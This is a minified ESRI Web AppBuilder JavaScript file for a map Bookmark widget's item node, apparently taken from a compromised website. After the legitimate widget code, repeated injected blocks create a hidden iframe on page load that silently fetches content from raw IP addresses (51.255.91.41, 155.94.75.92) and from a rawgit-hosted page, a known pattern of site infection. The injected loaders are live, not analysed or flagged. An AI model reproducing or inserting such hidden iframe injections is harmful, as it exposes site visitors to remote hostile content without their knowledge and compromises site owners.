// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Bookmark/ItemNode.html":'\x3cdiv class\x3d"jimu-img-node jimu-float-leading clearFix" data-id\x3d""\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"dragMasker" class\x3d"drag-masker"\x3e\x3c/div\x3e\x3c!--for different browsers drag behavior--\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"selectedBtn" class\x3d"selected-btn oper-btns no-user-select hide"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"nodeBox" class\x3d"node-box verticalCenter no-user-select"\x3e\r\n\t\t\x3cimg data-dojo-attach-point\x3d"thumbnail" class\x3d"thumbnail" src\x3d""\x3e\r\n\t\x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"nodeLabel" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3d"true" data-dojo-props\x3d"trim:true"\x3e\x3c/div\x3e\r\n\r\n\t\x3cdiv data-dojo-attach-point\x3d"deleteBtn" class\x3d"delete-btn oper-btns no-user-select"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"editBtn" class\x3d"edit-btn oper-btns no-user-select"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"renameBtn" class\x3d"rename-btn oper-btns no-user-select"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"changeImgBtn" class\x3d"change-img-btn oper-btns no-user-select hide"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/html jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/on dojo/query jimu/utils dojo/text!./ItemNode.html dojo/mouse dijit/form/ValidationTextBox".split(" "),function(h,k,c,b,l,m,e,f,g,n){var d={},d=k([l,m,h],{templateString:n,isSelected:!1,postMixInProperties:function(){this.nls=c.mixin(this.nls,window.jimuNls.common)},postCreate:function(){b.setAttr(this.domNode,"data-id",g.sanitizeHTML(this.dataId));this.img&&b.setAttr(this.thumbnail,
"src",this.img);this.nls&&(b.setAttr(this.deleteBtn,"title",this.nls.deleteBtnTip),b.setAttr(this.editBtn,"title",this.nls.editBtnTip),b.setAttr(this.changeImgBtn,"title",this.nls.changeThumbnailTip),b.setAttr(this.renameBtn,"title",this.nls.editBtnTip),b.setAttr(this.thumbnail,"title",this.nls.dragReorderTip));this.display&&(!1===this.display.selectedBtn&&b.addClass(this.selectedBtn,"hide"),!1===this.display.editBtn&&b.addClass(this.editBtn,"hide"),!1===this.display.deleteBtn&&b.addClass(this.deleteBtn,
"hide"),!1===this.display.renameBtn&&b.addClass(this.renameBtn,"hide"),!0===this.display.selectedBtn&&b.removeClass(this.selectedBtn,"hide"),!0===this.display.changeImgBtn&&b.removeClass(this.changeImgBtn,"hide"));this.nodeLabel.setValue(g.sanitizeHTML(this.label));this._updateLabelTooltips(this.label);this.own(e(this.selectedBtn,"click",c.hitch(this,this.onSelected)));this.own(e(this.deleteBtn,"click",c.hitch(this,this.onDelete)));this.own(e(this.editBtn,"click",c.hitch(this,this.onEdit)));this.own(e(this.changeImgBtn,
"click",c.hitch(this,this.onChangeImg)));this.own(e(this.renameBtn,"click",c.hitch(this,this.onRenameClick)));this.own(e(this.nodeBox,"click",c.hitch(this,this.onNodeBoxClick)));this.own(e(this.dragMasker,"click",c.hitch(this,this.onNodeBoxClick)));!0===this.display.enableEditLabel?(this.own(e(this.nodeLabel,"click",c.hitch(this,this.onLabelClick))),this.own(e(this.nodeLabel,"change",c.hitch(this,this.onLabelChange))),this.own(e(this.nodeLabel,"blur",c.hitch(this,this.onLabelBlur)))):this.nodeLabel.setDisabled(!0);
this.own(e(this.nodeLabel,"contextmenu",c.hitch(this,function(a){a.preventDefault()})));this.own(e(this.nodeBox,"contextmenu",c.hitch(this,function(a){a.preventDefault()})))},onClick:function(){f(".jimu-img-node",this.getParent().domNode).removeClass("jimu-state-selected");f(this.domNode).addClass("jimu-state-selected");this.emit("click")},onNodeBoxClick:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("thumbnail-click")},onLabelClick:function(a){a&&
a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("label-click")},onLabelChange:function(a){this._updateLabelTooltips(a)},onLabelBlur:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());a=this.nodeLabel.get("value");this._updateLabelTooltips(a);this.emit("label-blur")},onSelected:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());b.hasClass(this.domNode,"selected")?(b.removeClass(this.domNode,
"selected"),this.isSelected=!1,!1!==a&&this.emit("unselected")):(b.addClass(this.domNode,"selected"),this.isSelected=!0,!1!==a&&this.emit("selected"))},onDelete:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("delete")},onEdit:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("edit")},onChangeImg:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("change-img")},
changeImg:function(a){b.setAttr(this.thumbnail,"src",a)},onRenameClick:function(a){a&&a.stopPropagation&&a.preventDefault&&(a.stopPropagation(),a.preventDefault());this.emit("rename")},highLight:function(){f(".jimu-img-node",this.getParent().domNode).removeClass("jimu-state-selected");f(this.domNode).addClass("jimu-state-selected")},startup:function(){this.inherited(arguments)},destroy:function(){this.inherited(arguments);b.destroy(this.domNode)},_updateLabelTooltips:function(a){a&&(a=g.sanitizeHTML(a),
b.setAttr(this.nodeLabel,"title",a),this.dragMasker&&b.setAttr(this.dragMasker,"title",a))}});d.addFloatLeading=function(a){a.itemNode&&a.itemNode.domNode&&(f(".selected-btn",a.itemNode.domNode).forEach(function(a){b.addClass(a,"jimu-float-leading")}),f(".node-box",a.itemNode.domNode).forEach(function(a){b.addClass(a,"jimu-float-leading")}),f(".node-label",a.itemNode.domNode).forEach(function(a){b.addClass(a,"jimu-float-leading")}),f(".close-btn",a.itemNode.domNode).forEach(function(a){b.addClass(a,
"jimu-float-leading")}))};d.removeFloatLeading=function(a){a.itemNode&&a.itemNode.domNode&&(f(".selected-btn",a.itemNode.domNode).forEach(function(a){b.removeClass(a,"jimu-float-leading")}),f(".node-box",a.itemNode.domNode).forEach(function(a){b.removeClass(a,"jimu-float-leading")}),f(".node-label",a.itemNode.domNode).forEach(function(a){b.removeClass(a,"jimu-float-leading")}),f(".close-btn",a.itemNode.domNode).forEach(function(a){b.removeClass(a,"jimu-float-leading")}))};d.toggleEditable=function(a){a.itemNode&&
a.itemNode.nodeLabel&&(a.itemNode.nodeLabel.disabled?d.enableEditable(a):d.disableEditable(a))};d.disableEditable=function(){};d.enableEditable=function(){};d.focusLabel=function(a){a.itemNode&&a.itemNode.nodeLabel&&a.itemNode.nodeLabel.focus()};d.unSelected=function(a){a.itemNode&&a.itemNode&&(a=a.itemNode,b.removeClass(a.domNode,"selected"),a.isSelected=!1)};d.show=function(a){a&&a.itemNode&&(a=a.itemNode,b.removeClass(a.domNode,"hide"),a.isShow=!0)};d.hide=function(a){a&&a.itemNode&&(a=a.itemNode,
b.addClass(a.domNode,"hide"),a.isShow=!1)};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});